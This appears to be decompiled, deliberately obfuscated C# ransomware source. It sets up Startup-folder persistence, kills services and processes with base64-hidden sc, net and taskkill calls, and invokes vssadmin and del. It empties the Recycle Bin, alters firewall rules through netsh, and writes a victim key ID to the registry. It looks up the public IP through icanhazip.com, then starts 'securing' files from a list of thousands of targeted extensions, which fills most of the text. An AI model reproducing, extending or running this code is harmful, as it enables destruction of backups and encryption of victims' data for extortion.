		if (JMAzaRHPduh == "YES" && vmUKXHgePAyzJ.DICqAxqZDleFwHj())
		{
			new RxFJqSbhHcd().oUyyOuPtzVaXRpIE(ApCvDRSfYgD: false);
			new RxFJqSbhHcd().IJzogCmMrhTJz();
		}
		if (SZPBdHRIlMJpRR == "YES")
		{
			XXiLNaSgQOtmo.KGGjPXavXwtXqAgp();
		}
		try
		{
			ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
			string fileName = mainModule.FileName;
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
			string text2 = text + Path.GetFileName(fileName);
			if (UecIcCodEwnka == "YES" && fileName != text2)
			{
				Thread thread4 = new Thread(qdIcAYcLmHe);
				thread4.IsBackground = true;
				thread4.Priority = ThreadPriority.Normal;
				thread4.Start();
			}
			if (BcZFdwiGYuZnFy == "YES" && mainModule != null && fileName != text2)
			{
				try
				{
					GcTbUfgEunS = gJRIjQflTys(0, PnQxSwddYDases.Count);
					File.Copy(fileName, text + PnQxSwddYDases[GcTbUfgEunS], overwrite: true);
					Process.Start(text + PnQxSwddYDases[GcTbUfgEunS]);
					pQsIRxMQfXRA();
					Process.GetCurrentProcess().Kill();
				}
				catch (Exception)
				{
				}
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (zPyIMavdBaBAPU == "YES" && DateTime.Now < zUXHvjwEmI)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (APlsmtlJYveR == "YES" && DateTime.Now > TXrpRvpTasTwlmB)
			{
				pQsIRxMQfXRA();
			}
		}
		catch
		{
		}
		Thread thread5 = new Thread((ThreadStart)delegate
		{
			Parallel.ForEach(AXHIhGyjeeBMt, delegate(string nKBectQQVh)
			{
				xQfMOPCvvVAqwp(joRKfFeYni("c2MuZXhl"), nKBectQQVh);
			});
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
			{
				Parallel.ForEach(cxuPuyDRPwMSp, delegate(string jaTHIkHSDwcbdK)
				{
					xQfMOPCvvVAqwp(joRKfFeYni("bmV0LmV4ZQ=="), jaTHIkHSDwcbdK);
				});
			}
			Parallel.ForEach(szeHmEmHOlMXs, delegate(string xfSeJFYLVcIt)
			{
				xQfMOPCvvVAqwp(joRKfFeYni("dGFza2tpbGwuZXhl"), xfSeJFYLVcIt);
			});
			if (rBsdayiXZHoe == "YES")
			{
				Parallel.ForEach(tKgBOoKLAyrw, delegate(string qKfVhknsEuENZ)
				{
					xQfMOPCvvVAqwp(joRKfFeYni("dGFza2tpbGwuZXhl"), "/IM " + qKfVhknsEuENZ + " /f");
				});
			}
			if (!LmZNugIjEba().Contains("XP"))
			{
				try
				{
					HEtSbTekjvbdmpa(jDEqIhTjGP);
				}
				catch (Exception)
				{
				}
				Parallel.ForEach(vcERAqomxNm, delegate(string vlGVRrFHQAU)
				{
					xQfMOPCvvVAqwp(joRKfFeYni(tvWunvyFIKOf("lhXZu4WatRWYzNnd")), vlGVRrFHQAU);
				});
			}
			else
			{
				Parallel.ForEach(vcERAqomxNm, delegate(string tBSYPjVrtzblbQ)
				{
					xQfMOPCvvVAqwp(joRKfFeYni(tvWunvyFIKOf("lhXZu4WatRWYzNnd")), tBSYPjVrtzblbQ);
				});
			}
			Parallel.ForEach(OpmmfikZaXsJBD, delegate(string pOxXNQBYkkBC)
			{
				xQfMOPCvvVAqwp(joRKfFeYni("ZGVsLmV4ZQ=="), pOxXNQBYkkBC);
			});
		});
		thread5.Priority = ThreadPriority.Normal;
		thread5.IsBackground = true;
		thread5.Start();
		try
		{
			string currentDirectory = Directory.GetCurrentDirectory();
			if (!vNjCRxJChaZG.Contains(currentDirectory))
			{
				vNjCRxJChaZG.Add(currentDirectory);
			}
			if (File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc")))
			{
				string[] array = File.ReadAllLines(Path.Combine(Directory.GetCurrentDirectory(), "Config.enc"));
				string[] array2 = array;
				foreach (string text3 in array2)
				{
					if (text3.Contains("PriorityPath="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && !vNjCRxJChaZG.Contains(text6) && text6 != "X:\\CustomPath1" && text6 != "Z:\\CustomPath2" && text6 != "\\\\Domain\\Path\\Folder")
								{
									vNjCRxJChaZG.Add(text6);
								}
							}
						}
					}
					if (text3.Contains("ExcludedPaths="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4))
						{
							string[] array3 = text4.Split(new char[1] { ',' });
							foreach (string text5 in array3)
							{
								string text6 = text5.Trim();
								if (Directory.Exists(text6) && text6 != "X:\\CustomPath1" && text6 != "Z:\\CustomPath2" && text6 != "\\\\Domain\\Path\\Folder")
								{
									XItXBmyQDtCnl.Add(text6);
								}
							}
						}
					}
					if (text3.Contains("Network="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "true")
						{
							fODFastDeDbE = "YES";
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "false")
						{
							fODFastDeDbE = "NO";
						}
					}
					if (text3.Contains("ConsoleMode="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "true")
						{
							aLMUqgosPdtj = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "false")
						{
							aLMUqgosPdtj = false;
						}
					}
					if (text3.Contains("DebugLog="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "true")
						{
							nOaztTOGmlogd = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "false")
						{
							nOaztTOGmlogd = false;
						}
					}
					if (text3.Contains("ImpersonateExplorer="))
					{
						string text4 = text3.Split(new char[1] { '=' })[1].Trim();
						if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "true")
						{
							bAJKJVOJOLbMhb = true;
						}
						else if (!string.IsNullOrEmpty(text4) && text4.ToLower() == "false")
						{
							bAJKJVOJOLbMhb = true;
						}
					}
				}
			}
		}
		catch (Exception ex6)
		{
			if (nOaztTOGmlogd)
			{
				try
				{
					File.AppendAllText(zRTqZqtXid, "Configuration text file error: " + ex6.Message);
				}
				catch (Exception)
				{
				}
			}
		}
		if (fODFastDeDbE == "NO")
		{
			KzhwOVaxGwr();
		}
		if (ZvJFLWaufAljve)
		{
			try
			{
				Console.WriteLine("Active Directory scanning in process...");
				eTbJkXZrVbpMZIzh.ufZkawwYoqoU();
			}
			catch (Exception ex6)
			{
				if (nOaztTOGmlogd)
				{
					try
					{
						File.AppendAllText(zRTqZqtXid, "Active Directory Scanning Error: " + ex6.Message);
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (fODFastDeDbE == "YES")
		{
			try
			{
				eKnjUPfnILwb();
			}
			catch
			{
			}
		}
		try
		{
			if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && SOayMzRkvc)
			{
				try
				{
					Thread thread6 = new Thread(JCFDOXBgxSd.pftycCNZjnHmX);
					thread6.IsBackground = true;
					thread6.Start();
				}
				catch
				{
				}
			}
		}
		catch (Exception)
		{
		}
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			xQfMOPCvvVAqwp("cmd.exe", joRKfFeYni("L2MgcmQgL3MgL3EgJVNZU1RFTURSSVZFJVxcJFJlY3ljbGUuYmlu"));
			if (fODFastDeDbE == "YES")
			{
				xQfMOPCvvVAqwp(joRKfFeYni("bmV0c2g="), joRKfFeYni(tvWunvyFIKOf("zVWW9UGbiFmblBydl5GIiwVeyVmdvN2cpREIrJ3b3RXZOJCX9AXdvJ3ZgUGb1JHI0V2cgwGbhdXZylmZgwGbhdXZylmZ2RWY")));
				xQfMOPCvvVAqwp(joRKfFeYni("bmV0c2g="), joRKfFeYni(tvWunvyFIKOf("=MXZZ1TZsJWYuVGI3VmbgIyZulmchh2UgIXZ05WayBFIk5WYgUGbpZkI9AXdvJ3ZgUGb1JHI0V2cgwGbhdXZylmZgwGbhdXZylmZ2RWY")));
			}
		}
		if (egnyhqecgWfvxd == "YES" && mCiYKRPmuLyH() && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Thread thread7 = new Thread(lOChwyQwVc.ILikfPKnbkfZ);
			thread7.IsBackground = false;
			thread7.Priority = ThreadPriority.Normal;
			thread7.Start();
		}
		if (!(uqgaoFxkZOh == "YES"))
		{
		}
		SecureString secureString = new SecureString();
		if (WIhylljKzkeZ == "NO")
		{
			if (!IUeXbBJIfNgWuv)
			{
				rtATyKSVirO = PKwivSqSMWQMr.VDTfUZkrNQelgE(32);
				zHvtZFBnnxDI = PKwivSqSMWQMr.zrnFDusRyLnSH();
			}
		}
		else
		{
			rtATyKSVirO = "6WUNF94TROMBYTYITJOZLC16DQ5TRXBM";
		}
		if (!IUeXbBJIfNgWuv)
		{
			EUefSwzLcwrcxo = NKZEXIbOvQYDU.yDrjchSwPn(rtATyKSVirO + zHvtZFBnnxDI);
		}
		else
		{
			try
			{
				oQXjkbABgIM();
				rtATyKSVirO = IsmQQjicQbUM(kmNoKFvTArlU(iZDhoDCXicua, QEwGnMMixZzfeOT(vcDNSNpbTqBA)));
				iZDhoDCXicua = null;
				zHvtZFBnnxDI = IsmQQjicQbUM(new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
				EUefSwzLcwrcxo = IsmQQjicQbUM(tRfebFlORRrk);
			}
			catch (Exception)
			{
				IUeXbBJIfNgWuv = false;
				rtATyKSVirO = PKwivSqSMWQMr.VDTfUZkrNQelgE(32);
				zHvtZFBnnxDI = PKwivSqSMWQMr.zrnFDusRyLnSH();
				EUefSwzLcwrcxo = NKZEXIbOvQYDU.yDrjchSwPn(rtATyKSVirO + zHvtZFBnnxDI);
			}
		}
		try
		{
			if (!zzEQfIIuvgiBbM)
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(joRKfFeYni("U09GVFdBUkVcS0VZSURcbXlLZXlJRA=="));
				if (registryKey != null)
				{
					registryKey.SetValue(joRKfFeYni("SUQ=") + (registryKey.ValueCount + 1), EUefSwzLcwrcxo);
					registryKey.Close();
				}
			}
			else
			{
				RegistryKey registryKey = Registry.CurrentUser.CreateSubKey(joRKfFeYni("U09GVFdBUkVcS0VZSURcbXlLZXlJRA=="));
				if (registryKey != null && registryKey.ValueCount == 0)
				{
					registryKey.SetValue(joRKfFeYni("SUQ=") + (registryKey.ValueCount + 1), EUefSwzLcwrcxo);
					registryKey.Close();
				}
				else if (registryKey != null && registryKey.ValueCount != 0)
				{
					registryKey.Close();
				}
			}
		}
		catch (Exception)
		{
			wKjZvwDAADJADi = true;
		}
		if (zSvnXhdXFcyye == "YES")
		{
			QIMtDoSaiwVe();
		}
		if (IXJSnBISlmQN)
		{
			try
			{
				if (!File.Exists(Path.Combine(Directory.GetCurrentDirectory(), mPCnRrJrfRICdG)))
				{
					File.WriteAllText(Path.Combine(Directory.GetCurrentDirectory(), mPCnRrJrfRICdG), string.Concat(joRKfFeYni("Q2xpZW50IElQOiA="), new WebClient().DownloadString(joRKfFeYni("aHR0cDovL2ljYW5oYXppcC5jb20=")), "\r\n", joRKfFeYni("RGF0ZSBvZiBlbmNyeXB0aW9uOiA="), DateTime.Now, "\r\n", joRKfFeYni("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog"), EUefSwzLcwrcxo));
				}
				else
				{
					File.AppendAllText(Path.Combine(Directory.GetCurrentDirectory(), mPCnRrJrfRICdG), "\r\nAdditional KeyID: " + EUefSwzLcwrcxo);
				}
			}
			catch (Exception ex12)
			{
				if (nOaztTOGmlogd)
				{
					try
					{
						File.AppendAllText(zRTqZqtXid, "Error while creating Local Report: " + ex12.Message + "\r\n");
					}
					catch (Exception)
					{
					}
				}
			}
		}
		if (!DJyFuHzPdduoi || wKjZvwDAADJADi)
		{
			pdCeuoZqBlC(EUefSwzLcwrcxo);
		}
		try
		{
			try
			{
				if (aLMUqgosPdtj)
				{
					Console.WriteLine("Files securing is about to start...");
				}
			}
			catch
			{
			}
			jufpjgujiaoBdHm(new string[1] { "[auto]" }, new string[4833]
			{
				"db", "dbf", "accdb", "dbx", "mdb", "mdf", "epf", "ndf", "ldf", "1cd",
				"sdf", "nsf", "fp7", "cat", "log", "$$$", "$db", "$efs", "$er", "^^^",
				"__a", "__b", "{pb", "~cw", "~hm", "0", "000", "001", "1", "101",
				"103", "108", "110", "113", "123", "128", "17t", "1CD", "1pe", "1ph",
				"1sp", "1st", "2", "2mg", "2Q0", "2QM", "3", "3d", "3d4", "3dd",
				"3df", "3df8", "3dm", "3dmdef", "3dp", "3dr", "3ds", "3dt", "3dw", "3dxml",
				"3fr", "3g2", "3ga", "3gp", "3gp2", "3me", "3MF", "3mm", "3pe", "3pr",
				"3w", "4dd", "4dl", "4dv", "4fs", "4w7", "5vw", "602", "73b", "73c",
				"73l", "7z", "7z001", "7z002", "7zip", "8", "86f", "89t", "89y", "8ba",
				"8bc", "8be", "8bf", "8bi8", "8bl", "8bs", "8bx", "8by", "8li", "8svx",
				"8xg", "8xk", "8xs", "8xt", "8xv", "9xt", "9xy", "a$v", "a00", "a01",
				"a02", "a2c", "a5l", "a5w", "a65", "aa", "aa3", "aac", "aaf", "aah",
				"aam", "aao", "aaui", "ab", "ab1", "ab3", "ab4", "ab65", "aba", "abbu",
				"abc", "abcd", "abf", "abi", "abk", "abkprj", "abp", "abt", "abw", "aby",
				"ac2", "ac3", "ac5", "aca", "acc", "accdc", "accde", "accdr", "accdt", "accft",
				"ACCTB", "ace", "acf", "acg", "ach", "ACL", "acp", "acq", "acr", "acrobatsecuritysettings",
				"acrodata", "acroplugin", "acrypt", "act", "acz", "ad", "ada", "adb", "adc", "adcp",
				"add", "addism", "ade", "adf", "adi", "adif", "adoc", "ados", "adox", "adp",
				"adpb", "adr", "ads", "adt", "adu", "adv", "advs", "adx", "adz", "aea",
				"aec", "aep", "aepx", "aes", "aet", "afd", "afdesign", "afe", "aff", "afi",
				"afm", "afp", "aft", "agd", "agd1", "agdl", "age3rec", "age3sav", "age3scn", "age3xrec",
				"age3xsav", "age3xscn", "age3yrec", "age3ysav", "age3yscn", "aggr", "ahf", "ai", "aif", "aifb",
				"aiff", "aim", "ain", "AIO", "aip", "ais", "ait", "ak", "al", "al8",
				"ala", "alb3", "alb4", "alb5", "alb6", "alc", "ald", "aldf", "alf", "ali",
				"allet", "alt3", "alt5", "alz", "AM", "amb", "amc", "amf", "aml", "amm",
				"amr", "amsorm", "amt", "amu", "amx", "amxx", "an1", "an8", "anime", "anl",
				"anme", "ann", "ans", "ansr", "ansym", "anx", "aoi", "ap", "apa", "apalbum",
				"apd", "ape", "apf", "aph", "api", "apj", "apk", "aplibrary", "apnx", "apo",
				"app", "APPCACHE", "approj", "APPX", "apr", "apt", "apw", "apxl", "apz", "ar",
				"arc", "arch00", "archiver", "arduboy", "arff", "ari", "arj", "arn", "aro", "arr",
				"ars", "art", "arw", "as", "as$", "as3", "asa", "asc", "ascm", "ascx",
				"asd", "ase", "asf", "ashbak", "ashdisc", "ashprj", "ashx", "ask", "asl", "asm",
				"asmx", "asn", "asnd", "asp", "aspx", "asr", "asset", "ast", "asv", "asvx",
				"asx", "atf", "ath", "atl", "atomsvc", "atr", "ats", "atw", "automaticdestinations-ms", "aux",
				"av", "avc", "avhd", "avhdx", "avj", "avl", "avn", "avp", "avs", "AW",
				"awb", "awbr", "awd", "awdb", "awe", "awg", "awp", "aws", "awt", "aww",
				"awwp", "ax", "azf", "azs", "azw", "azw1", "azw3", "azw4", "azz", "azzx",
				"b", "b1", "b27", "b2a", "b5i", "b5t", "b64", "b6i", "b6t", "b6z",
				"ba", "ba6", "ba7", "ba8", "ba9", "bac", "back", "backup", "backupdb", "bad",
				"bafl", "bak", "bak~", "bak2", "bak3", "bakx", "bamboopaper", "bank", "bar", "baserproj",
				"bau", "bax", "bay", "bbb", "bbcd", "bbl", "bbprojectd", "bbs", "bbxt", "bbz",
				"bc", "bc5", "bc6", "bc7", "bcc", "bcd", "bci", "bck", "bckp", "bcl",
				"bcm", "bcp", "bct", "bdb", "bdb2", "bdc", "bdf", "bdic", "bdoc", "bdp",
				"bdr", "bdt2", "bdt3", "bean", "bed", "bfa", "bff", "bfx", "bgl", "bgt",
				"bgv", "bh", "bho", "bi8", "bib", "bibtex", "bic", "bif", "bifx", "big",
				"bik", "bil", "bim", "bin", "bina", "binary", "bionix", "BIT", "bizdocument", "bjl",
				"bjo", "bk", "bk!", "bk1", "bk2", "bk3", "bk4", "bk5", "bk6", "bk7",
				"bk8", "bk9", "bkc", "bkf", "bkg", "bkp", "bks", "bkup", "bkz", "blb",
				"bld", "blend", "blend1", "blend2", "blg", "blk", "blm", "bln", "blob", "blockplt",
				"blogthis", "blp", "bluebutton", "bm2", "bm3", "bmc", "bmf", "bmk", "bml", "bmm",
				"bmml", "bmpr", "bms", "bna", "bndl", "bnk", "boc", "bok", "boo", "book",
				"bookexport", "bop", "box", "bp1", "bp2", "bp3", "bpa", "bpb", "bpd", "bpdx",
				"bpf", "bphys", "bpj", "bpk", "bpl", "bplx", "bpm", "bpmc", "bpn", "bps",
				"bpw", "brain", "brd", "breaking_bad", "brf", "brh", "brl", "brn", "BROWSER", "brs",
				"brw", "brx", "bsa", "bsd", "bsdl", "bsk", "bso", "bsp", "bst", "btd",
				"btf", "btif", "btinstall", "BTL", "btm", "btoa", "btr", "btx", "BUD", "bul",
				"bundle", "bup", "burn", "burntheme", "bvd", "bvp", "bwa", "bwd", "bwf", "bwi",
				"bwp", "bws", "bwt", "bwz", "BXF", "bxx", "bz", "bz2", "bza", "bzabw",
				"bzip", "bzip2", "c", "c00", "c01", "c02", "c10", "c2e", "c3d", "c4p",
				"c6", "cadoc", "cae", "caf", "cag", "calca", "cam", "camm", "camproj", "cap",
				"capt", "capx", "car", "caro", "cas", "catproduct", "cav", "cawr", "cb7", "cba",
				"cbf", "cbg", "cbmap", "cbor", "cbr", "cbs", "cbt", "cbu", "cbz", "cc",
				"cca", "ccc", "ccd", "ccf", "cch", "ccitt", "ccld", "ccp", "cct", "cd",
				"cd1", "cd2", "cdb", "cdc", "cdd", "cddz", "cdf", "cdi", "cdk", "cdl",
				"cdm", "cdml", "cdmm", "cdmz", "cdp", "cdpz", "cdr", "cdr3", "cdr4", "cdr5",
				"cdr6", "cdrw", "cds", "cdt", "cdtx", "cdx", "cdxml", "ce1", "ce2", "cef",
				"cel", "celtx", "cenon~", "cer", "cert", "cf", "cf5", "cfa", "cfb", "cfd",
				"cfg", "cfp", "cfr", "cfs", "cfx", "cgf", "cgfiletypetest", "cgi", "cgm", "cgp",
				"chg", "chi", "chk", "chm", "chml", "chmprj", "chp", "chpscrap", "CHR", "cht",
				"chtml", "cib", "cida", "cif", "cipo", "circ", "ciso", "civ4worldbuildersave", "civbeyondswordsave", "ck9",
				"ckp", "ckt", "cl2", "cl2arc", "cl2doc", "cl5", "clam", "clarify", "class", "classlist",
				"clb", "cld", "clg", "clix", "clk", "clkd", "clkm", "clks", "clkt", "clktk",
				"clkv", "clm", "clp", "clr", "cls", "clx", "cm10", "cm5", "cma", "cmap",
				"CMB", "cmbl", "cmf", "cml", "cmp", "cmr", "cms", "cmt", "cmu", "cna",
				"cnf", "cng", "cnt", "cnv", "cod", "col", "collab", "comicdoc", "comiclife", "COMMENTS",
				"compositionmodel", "compositiontemplate", "con", "conf", "config", "contact", "converterx", "cp", "cp9", "CPA",
				"cpaa", "cpc", "cpd", "cpdt", "cpf", "cpgz", "cphd", "cpi", "cpio", "cpk",
				"cpmz", "cpp", "cpt", "cptx", "cpy", "cr2", "cram", "crashed", "craw", "crb",
				"crd", "crds", "creole", "crev", "cri", "crjoker", "crs", "crs3", "crt", "crtr",
				"crtx", "crw", "crwl", "cry", "crypt", "crypt12", "crypt8", "crypt9", "crypted", "cryptowall",
				"cryptra", "cs", "cs8", "csa", "csd", "cse", "CSG", "csh", "csi", "csl",
				"csm", "cso", "csp", "csr", "css", "cst", "csv", "ctb", "ctbl", "ctd",
				"cte", "ctf", "CTG", "ctl", "ctm", "ctp", "ctproject", "ctt", "ctv", "ctv3",
				"ctx", "ctxt", "cty", "cub", "cube", "cue", "current", "cursorfx", "curxptheme", "cva",
				"cvd", "cvj", "cvl", "cvn", "cvw", "cw3", "cwf", "cwk", "cwn", "cwr",
				"cws", "cww", "cwwp", "cxa", "cxarchive", "cxd", "cxf", "cxr", "cxt", "cyi",
				"cyo", "cys", "czi", "czip", "czp", "d", "d00", "d01", "d3dbsp", "d64",
				"d88", "da0", "da2", "daa", "dac", "dacpac", "dad", "dadiagrams", "dadx", "daf",
				"dag", "dal", "dam", "dao", "dap", "dar", "das", "daschema", "dash", "dat",
				"DATA", "database", "datx", "dax", "dayzprofile", "dazip", "db_journal", "db0", "db3", "dba",
				"dbb", "dbc", "dbcrypt12", "dbcrypt8", "dbd", "DBF", "dbfv", "dbgsym", "db-journal", "dbk",
				"dbr", "dbs", "db-shm", "dbt", "dbv", "db-wal", "dc2", "dc4", "dca", "dcb",
				"dcd", "dcf", "dch", "dcl", "dcm", "dcmd", "dcmf", "dco", "dcp", "dcpf",
				"dcpr", "dcr", "dcs", "dct", "dct5", "dcu", "dcx", "dd", "ddb", "ddc",
				"ddcx", "ddd", "ddf", "ddif", "ddl", "ddoc", "ddrw", "dds", "ddt", "deb",
				"debian", "dec", "ded", "def", "default", "del", "dem", "DEP", "deproj", "der",
				"des", "desc", "description", "design", "desklink", "det", "deu", "dev", "develve", "deviceinfo",
				"dex", "dfe", "dfl", "dfm", "dfproj", "dft", "dfti", "dgc", "dgm", "DGML",
				"dgpd", "dgr", "dgrh", "dgs", "dhcd", "dhe", "dia", "dic", "dict", "did",
				"dif", "dig", "dii", "dim", "dime", "dip", "dir", "directory", "disc", "disco",
				"disk", "dist", "dit", "dita", "ditamap", "ditaval", "divx", "diz", "djbz", "djv",
				"djvu", "dk@p", "dkt", "dl", "dl_", "dlc", "dlg", "dlis", "dlt", "dltemp",
				"dm2", "dmbk", "dmc", "dmg", "dmgpart", "dmm", "dmmx", "dmo", "dmp", "dmpr",
				"dmr", "dms", "dmsp", "dmtemplate", "dmv", "dna", "dng", "dnl", "dob", "doc",
				"doc#", "docb", "doce", "docenx", "dochtml", "dockzip", "docl", "docm", "docmhtml", "docs",
				"docset", "docstates", "doct", "documentrevisions-v100", "docx", "docxl", "docxml", "dok", "dot", "dothtml",
				"dotm", "dotmenx", "dotx", "dotxenx", "dox", "doxy", "doz", "dp", "dp1", "dpb",
				"DPC", "dpd", "dpi", "dpk", "dpl", "dpn", "dpr", "dps", "dpt", "dpx",
				"dqy", "dr", "drd", "dream", "drf", "drl", "drm", "drmx", "drmz", "drscan",
				"drw", "dsb", "dsc", "dsd", "dsdic", "dsf", "dsg", "dsk", "dsl", "dsn",
				"dsp", "dss", "dsx", "dsy", "dsz", "dt", "dta", "dtd", "dtm", "dtml",
				"dtp", "dtr", "dtsx", "dtx", "dump", "dupeguru", "dvb", "dvc", "dvd", "dvdproj",
				"dvds", "dvi", "dvo", "dvs", "dvx", "dvz", "dwd", "dwdoc", "dwf", "dwfx",
				"dwg", "dwi", "dwlibrary", "dwp", "dws", "dwt", "dxb", "dxd", "dxe", "dxf",
				"dxg", "dxl", "dxn", "dxp", "dxr", "dxstudio", "dz", "dzp", "e01", "e2p",
				"e3s", "e4a", "eap", "eas", "easmx", "ebk", "ebm", "ebs", "ebuild", "ec0",
				"ec3", "ec4", "ecc", "ecl", "ecm", "eco", "ecr", "ecs", "ecsbx", "ect",
				"ecx", "eda", "edat", "edat2", "edb", "edd", "ede", "edf", "edfx", "edg",
				"edi", "edk", "edl", "edml", "edn", "edoc", "edq", "edrwx", "eds", "edt",
				"edv", "edz", "eep", "ef", "efa", "efax", "eff", "efl", "efm", "efp",
				"efr", "eftx", "efu", "efw", "efx", "egg", "eglib", "egp", "egr", "egt",
				"ehp", "eif", "eip", "ekb", "ekm", "el6", "eld", "elf", "elfo", "eln",
				"els", "em", "emb", "embl", "emc", "emd", "emf", "eml", "emlxpart", "emm",
				"emrg", "emrg2", "enc", "enciphered", "encrypted", "enex", "enfpack", "enl", "enlx", "enq",
				"ent", "env", "enw", "enx", "enyd", "eob", "eot", "ep", "epdf", "EPF",
				"epi", "epim", "epk", "epp", "eprtx", "eps", "epsf", "ept", "epub", "epw",
				"eql", "er1", "erbsql", "erd", "ere", "erf", "erg", "erp", "err", "ersx",
				"es", "es2", "es3", "esb", "esc", "esd", "ese", "esf", "esm", "esp",
				"esq", "ess", "est", "esv", "esx", "et", "ete", "etng", "etnt", "ets",
				"ett", "etx", "euc", "eui", "ev", "EV1", "EV2", "EV3", "ev3p", "ev3s",
				"evo", "evx", "evy", "ewl", "ews", "ex", "ex01", "exb", "exc", "exd",
				"exf", "exif", "exl", "exm", "exp", "exprwdhtml", "exprwdxml", "exx", "ez", "ezc",
				"ezm", "ezs", "ezz", "f", "f04", "f06", "f3z", "f4v", "f90", "f96",
				"fa", "fac", "fadein", "fae", "familyfile", "faq", "far", "fas", "fasta", "fax",
				"fbc", "fbd", "fbf", "fbk", "fbp6", "fbq", "fbs", "fbu", "fbw", "fcd",
				"fcf", "fcpbundle", "fcpevent", "fcpproject", "fcpxdest", "fcpxml", "fcs", "fcstd", "fct", "fd",
				"fdb", "fdd", "fdf", "fdi", "fdm", "fdoc", "fdp", "fdr", "fds", "fdseq",
				"fdt", "fdw", "fdx", "FE", "fed", "feed-ms", "feedsdb-ms", "fes", "ff", "ffa",
				"ffd", "ffdata", "fff", "ffindex", "ffl", "ffo", "fft", "ffwp", "ffx", "fg3",
				"fh", "fhc", "fhd", "fhf", "fic", "fid", "fig", "fil", "fin", "fingnet",
				"fl", "fla", "flac", "flag", "flam3", "flame", "flat", "flf", "flg", "flib",
				"flipchart", "flk", "flka", "flkb", "fll", "flm", "flo", "flow", "flp", "fls",
				"flt", "fltr", "flv", "flvv", "flwa", "fly", "fm", "fm3", "fmat", "fmc",
				"fmd", "fmf", "fml", "fmp", "fmp12", "fmp3", "fmpsl", "fmt", "fnbk", "fnf",
				"fnm", "fnrecipes", "fo", "fob", "fodg", "fodp", "fods", "fodt", "fol", "folio",
				"folx", "fop", "for", "forge", "fos", "fountain", "fox", "fp", "fp3", "fp4",
				"fp5", "fp8", "fpa", "fpage", "fpdoclib", "fpenc", "fphomeop", "fpk", "fplinkbar", "fpp",
				"fpr", "fpsl", "fpsx", "fpt", "fpx", "fqc", "fra", "frag", "frameset", "frd",
				"frdat", "frdoc", "freepp", "frelf", "frl", "frm", "fro", "fs", "fsa", "fsc",
				"fsd", "fsf", "fsh", "fsif", "fsp", "fss", "fstab", "ft10", "ft11", "ft7",
				"ft8", "ft9", "ftil", "ftl", "ftm", "ftmb", "ftr", "ftw", "ful", "fwbackup",
				"fwdict", "fwk", "fwtemplate", "FX", "fxd", "fxf", "fxg", "fxo", "fxp", "fxr",
				"fza", "fzb", "fzbz", "fzh", "fzip", "fzpz", "g1m", "g3m", "g41", "ga3",
				"gadgeprj", "gal", "gallery", "gam", "gan", "gar", "gb", "gb1", "gb2", "gbi",
				"gbk", "gbl", "gbo", "gbp", "gbr", "gbs", "gc", "gca", "gcd", "gcg",
				"gcproj", "gcsx", "gct", "gcw", "gcx", "gd3", "gdb", "gdbtable", "gdc", "gdf",
				"GDL", "gdoc", "gdrive", "gdt", "gdtb", "ged", "gedata", "gedcom", "gen", "genbank",
				"geo", "gev", "gevl", "gexf", "gfe", "gfi", "gform", "gfs", "gfx", "ggb",
				"ghe", "gho", "ghs", "gi", "gil", "gis", "giw", "gkh", "gla", "gld",
				"glink", "glk", "glo", "glos", "gls", "gly", "gmap", "gmbl", "gml", "gmp",
				"gms", "gmz", "gnd", "gno", "gnp", "gnutar", "gofin", "gp3", "gp4", "gpd",
				"gpf", "gpg", "gpi", "gpj", "gpn", "gpp", "gpr", "gpscan", "gpx", "gpz",
				"gra", "grade", "graphml", "graphmlz", "gray", "grd", "grdb", "grey", "grf", "grib",
				"grib2", "grind", "grindx", "grk", "grle", "groups", "grp", "grr", "grs", "grt",
				"grv", "GRXML", "gry", "gs", "gsa", "gs-bck", "gsf", "gsheet", "gslides", "gsm",
				"GTA", "gtable", "gtar", "gthr", "gtl", "gtm", "gto", "gtp", "gts", "gui",
				"guides", "gul", "gvi", "gwi", "gwk", "gwp", "gxk", "gxl", "gxt", "gz",
				"gz2", "gza", "gzi", "gzig", "gzip", "h", "h10", "h11", "h12", "h13",
				"h14", "h15", "h16", "h17", "h1q", "h1s", "h1w", "h2o", "h2w", "h3m",
				"h4", "h4r", "h5", "h6x", "h77t", "haas", "hal", "haml", "hbk", "hbl",
				"hbx", "hc", "hcc", "hce", "hci", "hcl", "HCP", "hcr", "hcu", "hcw",
				"hcx", "hcxs", "hda", "hdb", "hdd", "hdf", "hdi", "hdl", "hdpmx", "hds",
				"hdt", "hdumx", "hdx", "hed", "help", "helpindex", "HEQ", "hex", "hfd", "hfs",
				"hft", "hfv", "hhs", "hif", "hin", "his", "hjt", "hkdb", "HKF", "hkx",
				"hl", "hlf", "hlp", "hlx", "hlx2", "hlz", "hm2", "hm3", "hml", "hmskin",
